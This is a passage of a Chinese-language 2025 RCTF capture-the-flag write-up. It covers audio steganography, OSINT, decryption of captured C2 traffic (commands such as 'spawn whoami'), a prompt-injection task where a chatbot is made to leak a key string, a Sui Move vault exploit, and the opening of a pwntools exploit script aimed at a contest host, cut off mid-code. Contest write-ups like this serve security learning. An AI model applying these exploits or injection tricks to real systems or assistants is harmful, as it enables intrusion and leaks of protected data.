</span></span><span class=line><span class=cl>        <span class=n>vol</span> <span class=o>=</span> <span class=n>rms_volume</span><span class=p>(</span><span class=n>segment</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>bit</span> <span class=o>=</span> <span class=mi>1</span> <span class=k>if</span> <span class=n>vol</span> <span class=o>&gt;=</span> <span class=n>VOLUME_THRESHOLD</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=n>bits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>bit</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;Feel.flac&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>bitstring</span> <span class=o>=</span> <span class=n>extract_volume_bits</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>bitstring</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到答案I Feel Fantastic heyheyhey</p><p>第三问 通过搜索第二问的答案可以找到这个猎奇小玩意</p><p><img src=/img/2025-RCTF/35.png alt=img></p><p>然后可以gpt梭哈</p><p><img src=/img/2025-RCTF/36.png alt=img></p><p>第四问</p><p>继续gpt梭哈，页面也可以自己搜到，不难</p><p><img src=/img/2025-RCTF/37.png alt=img></p><p>同时通过调查可以发现一篇关键文章 <a href=https://yitzilitt.medium.com/the-story-behind-i-feel-fantastic-tara-the-singing-android-and-john-bergeron-fc83de9e8f36>https://yitzilitt.medium.com/the-story-behind-i-feel-fantastic-tara-the-singing-android-and-john-bergeron-fc83de9e8f36</a> 里面有我们想要的所有内容</p><p>第五问</p><p>在关键文章的评论里可以找到</p><p>答案为https://www.findagrave.com/memorial/63520325/john-louis-bergeron</p><p><img src=/img/2025-RCTF/38.png alt=img></p><h2 id=shadows-of-asgard>Shadows of Asgard</h2><p>流量分析题</p><p>第一问</p><p>跟踪第一个http流就看到了</p><p><img src=/img/2025-RCTF/39.png alt=img></p><p>第二问</p><p>往后分析，发现这里传了aeskey和iv还有data，说明是aes加密了数据 并且key一直没变</p><p><img src=/img/2025-RCTF/40.png alt=img></p><p>ai搞了个脚本来解密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># === 填入你的数据 ===</span>
</span></span><span class=line><span class=cl><span class=n>aesKey_b64</span> <span class=o>=</span> <span class=s2>&#34;WzUsMTM5LDI0NSwyMjAsMjMxLDQ2LDIzNCwxNDYsMjQ4LDIxMSwyLDIxMywyLDE2NSw5OCwxMTgsMTAzLDE2MiwzLDE1MCw0LDUzLDE3OSwxOTQsODQsMjA3LDQ1LDI0NSw4OCwxNzksMTkzLDEwMV0=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>aesIV_b64</span>  <span class=o>=</span> <span class=s2>&#34;WzEyNCwyMzIsMjU0LDE5LDI1MCw0OSw1MCw4MywyMjksMjQ0LDI4LDIyMiw4MywzMywyMDIsNl0=&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data_hex</span>   <span class=o>=</span> <span class=s2>&#34;6781ed63ff3d0c5a8960573c821f293cf3f59d678671645d40a72c9ed3bbccd29ad40f754ef11b77b033f8338888a30080f7dfb242241bf1fae6e4cd903e3c257457846ece5bb9c190ee9fc367f728daadabfabf929e75c7db7e111a32919c0e&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># === decode key/iv ===</span>
</span></span><span class=line><span class=cl><span class=n>aesKey</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>aesKey_b64</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>aesIV</span>  <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>aesIV_b64</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data_hex</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>try_aes_cbc</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>ct</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pt</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ct</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># CBC 需要去 padding</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>unpad</span><span class=p>(</span><span class=n>pt</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>try_aes_ctr</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>iv</span><span class=p>,</span> <span class=n>ct</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># CTR 的 iv 是 nonce</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CTR</span><span class=p>,</span> <span class=n>nonce</span><span class=o>=</span><span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pt</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ct</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>pt</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># === 尝试解密 ===</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=== 尝试 AES-256-CBC ===&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cbc_res</span> <span class=o>=</span> <span class=n>try_aes_cbc</span><span class=p>(</span><span class=n>aesKey</span><span class=p>,</span> <span class=n>aesIV</span><span class=p>,</span> <span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>cbc_res</span> <span class=k>if</span> <span class=n>cbc_res</span> <span class=k>else</span> <span class=s2>&#34;CBC 解密失败&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>=== 尝试 AES-256-CTR ===&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ctr_res</span> <span class=o>=</span> <span class=n>try_aes_ctr</span><span class=p>(</span><span class=n>aesKey</span><span class=p>,</span> <span class=n>aesIV</span><span class=p>,</span> <span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ctr_res</span> <span class=k>if</span> <span class=n>ctr_res</span> <span class=k>else</span> <span class=s2>&#34;CTR 解密失败&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>解出路径</p><p><img src=/img/2025-RCTF/41.png alt=img></p><p>第三问</p><p>一样的解数据，根据描述藏了隐写，同一个流里发现png图片内有base数据</p><p><img src=/img/2025-RCTF/42.png alt=img></p><p>提出来解密就行，得到id</p><p><img src=/img/2025-RCTF/43.png alt=img></p><p>第四问</p><p>找数据然后解密</p><p><img src=/img/2025-RCTF/44.png alt=img></p><p>第五问</p><p>接着解数据</p><p><img src=/img/2025-RCTF/45.png alt=img></p><p><img src=/img/2025-RCTF/46.png alt=img></p><h2 id=the-alchemists-cage>The Alchemist&rsquo;s Cage</h2><p>ez提示注入题</p><p>进去先输个soul 创建个对象</p><p>然后就可以开始在五轮内进行注入攻击了，很简单的，随便让它爆爆就出来了，这里是让它重复上一轮回复，当出现指定关键词（这里是谎言），输出关键字符串</p><p><img src=/img/2025-RCTF/47.png alt=img></p><h2 id=asgard-fallen-down>Asgard Fallen Down</h2><p>流量分析题</p><p><strong>Challenge 1: The First Command</strong></p><p>干扰的流量太多，不太好找</p><p>在流207中发现类似连接成功的流量</p><p><img src=/img/2025-RCTF/48.png alt=img></p><p>解码看看，看到了熟悉的进程</p><p><img src=/img/2025-RCTF/49.png alt=img></p><p>同时我们注意到，响应包中有三个奇怪的base64字符串</p><p><img src=/img/2025-RCTF/50.png alt=img></p><p>解码看一下，发现第一个长度是32，第二个是16，猜测为AES的key和iv</p><p><img src=/img/2025-RCTF/51.png alt=img></p><p><img src=/img/2025-RCTF/52.png alt=img></p><p>继续往后看，在之后紧跟着的包中看到，一串神秘的base64</p><p><img src=/img/2025-RCTF/53.png alt=img></p><p>使用之前得到的密钥和iv可以成功解密</p><p><img src=/img/2025-RCTF/54.png alt=img></p><p>得到命令<code>spawn whoami</code></p><p>然后在之后的</p><p><img src=/img/2025-RCTF/55.png alt=img></p><p>得到命令执行结果</p><p><img src=/img/2025-RCTF/56.png alt=img></p><p><strong>Challenge 2: The Heartbeat</strong></p><p>很明显之前的命令执行过程含有心跳包机制，在207流中很明显看到时间间隔是<code>10s</code></p><p><img src=/img/2025-RCTF/57.png alt=img></p><p><strong>Challenge 3: The Heart of Iron</strong></p><p>继续解密即可</p><p><img src=/img/2025-RCTF/58.png alt=img></p><p><img src=/img/2025-RCTF/59.png alt=img></p><p>找到响应包解密</p><p><img src=/img/2025-RCTF/60.png alt=img></p><p><img src=/img/2025-RCTF/61.png alt=img></p><p>得到答案<code>Intel64 Family 6 Model 191 Stepping 2, GenuineIntel</code></p><p><strong>Challenge 4: Odin&rsquo;s Eye</strong></p><p>搜索关键词<code>build:20251115</code>可在2787流中找到本题的执行命令</p><p><img src=/img/2025-RCTF/62.png alt=img></p><p><img src=/img/2025-RCTF/63.png alt=img></p><p>发现之后有很多大块的响应包，猜测是可能图片base64后太大一次不好传输于是分段传输</p><p>正则匹配，解密</p><p><img src=/img/2025-RCTF/64.png alt=img></p><p>不知道为啥cbc没解出来，cbcnopadding出了</p><p>解密result</p><p><img src=/img/2025-RCTF/65.png alt=img></p><p>得到图片，工具是<code>TscanPlus</code></p><p><img src=/img/2025-RCTF/66.png alt=img></p><h2 id=vault>vault</h2><p>丢给ai分析大概知道是要用sui环境去编译然后运行程序跟靶机进行交互</p><p>去下个预编译好的程序，然后就可以跑了</p><p>关键在代码</p><p>但是不懂区块链只能让ai帮忙做，换了两轮ai，gpt和gemini都怪怪的，最后用claude梭出来了</p><p>改了客户端的vault.move 然后修改Move.toml和Solve.move拿到了flag</p><p><img src=/img/2025-RCTF/67.png alt=img></p><p><img src=/img/2025-RCTF/68.png alt=img></p><p><a href=https://claude.ai/share/87c74de4-00d5-4ac9-bfce-a8faecb24525>https://claude.ai/share/87c74de4-00d5-4ac9-bfce-a8faecb24525</a></p><p><img src=/img/2025-RCTF/69.png alt=img></p><p><img src=/img/2025-RCTF/70.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>module</span> <span class=n>solution</span><span class=o>::</span><span class=n>solution</span> <span class=p>{</span>     <span class=n>use</span> <span class=n>sui</span><span class=o>::</span><span class=n>coin</span><span class=o>::</span><span class=p>{</span><span class=n>Self</span><span class=p>,</span> <span class=n>TreasuryCap</span><span class=p>};</span>     <span class=n>use</span> <span class=n>sui</span><span class=o>::</span><span class=n>tx_context</span><span class=o>::</span><span class=n>TxContext</span><span class=p>;</span>     <span class=n>use</span> <span class=n>challenge</span><span class=o>::</span><span class=n>vault</span><span class=o>::</span><span class=p>{</span><span class=n>Self</span><span class=p>,</span> <span class=n>Vault</span><span class=p>,</span> <span class=n>AirdropTracker</span><span class=p>};</span>     <span class=n>use</span> <span class=n>challenge</span><span class=o>::</span><span class=n>vault_coin</span><span class=o>::</span><span class=n>VAULT_COIN</span><span class=p>;</span>      <span class=k>public</span> <span class=n>fun</span> <span class=nf>solve</span><span class=p>(</span>         <span class=nl>vault</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>mut</span> <span class=n>Vault</span><span class=p>,</span>         <span class=nl>tracker</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>mut</span> <span class=n>AirdropTracker</span><span class=p>,</span>         <span class=nl>treasury</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>mut</span> <span class=n>TreasuryCap</span><span class=o>&lt;</span><span class=n>VAULT_COIN</span><span class=o>&gt;</span><span class=p>,</span>         <span class=nl>ctx</span><span class=p>:</span> <span class=o>&amp;</span><span class=n>mut</span> <span class=n>TxContext</span>     <span class=p>)</span> <span class=p>{</span>         <span class=n>vault</span><span class=o>::</span><span class=n>request_airdrop</span><span class=p>(</span><span class=n>tracker</span><span class=p>,</span> <span class=n>treasury</span><span class=p>,</span> <span class=n>ctx</span><span class=p>);</span>         <span class=n>let</span> <span class=n>proof_coin</span> <span class=o>=</span> <span class=n>coin</span><span class=o>::</span><span class=n>mint</span><span class=p>(</span><span class=n>treasury</span><span class=p>,</span> <span class=mi>100</span><span class=n>_000_000_000</span><span class=p>,</span> <span class=n>ctx</span><span class=p>);</span>         <span class=n>vault</span><span class=o>::</span><span class=n>buy_flag</span><span class=p>(</span><span class=n>tracker</span><span class=p>,</span> <span class=n>vault</span><span class=p>,</span> <span class=n>proof_coin</span><span class=p>,</span> <span class=n>ctx</span><span class=p>);</span>     <span class=p>}</span> <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-RCTF/71.png alt=img></p><h1 id=pwn>Pwn</h1><h2 id=only>only</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;101.245.98.115 26100&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./chal&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>(</span><span class=n>argv</span><span class=o>=</span><span class=p>[],</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span><span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span><span class=n>gdbscript</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=o>.</span><span class=n>TAG</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>),</span><span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>REM</span><span class=p>:</span><span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=o>*</span><span class=n>attack</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>process</span><span class=p>([</span><span class=n>binary</span><span class=p>]</span> <span class=o>+</span> <span class=n>argv</span><span class=p>,</span> <span class=o>*</span><span class=n>a</span><span class=p>,</span> <span class=o>**</span><span class=n>kw</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#context(arch=&#39;amd64&#39;, log_level = &#39;debug&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=n>terminal</span><span class=o>=</span><span class=s1>&#39;tmux splitw -h -l 170&#39;</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = context.binary.libc</span>
</span></span><span class=line><span class=cl><span class=c1>#elf  = ELF(binary)</span>
</span></span><span class=line><span class=cl><span class=c1>#print(context.binary.libs)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = ELF(&#39;./libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=c1>#import socks</span>
</span></span><span class=line><span class=cl><span class=c1>#context.proxy = (socks.SOCKS5, &#39;192.168.64.1&#39;, 10808)</span>
</span></span><span class=line><span class=cl><span class=n>gdbscript</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x001A40
</span></span></span><span class=line><span class=cl><span class=s1>brva 0x001A32
</span></span></span><span class=line><span class=cl><span class=s1>#continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=o>**</span><span class=nb>locals</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1>#import os</span>
</span></span><span class=line><span class=cl><span class=c1>#os.systimport os</span>
</span></span><span class=line><span class=cl><span class=c1>#io = remote(*attack.split(&#39;:&#39;))</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>([])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>notes</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;exit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;back</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;size:&#39;</span><span class=p>)</span>
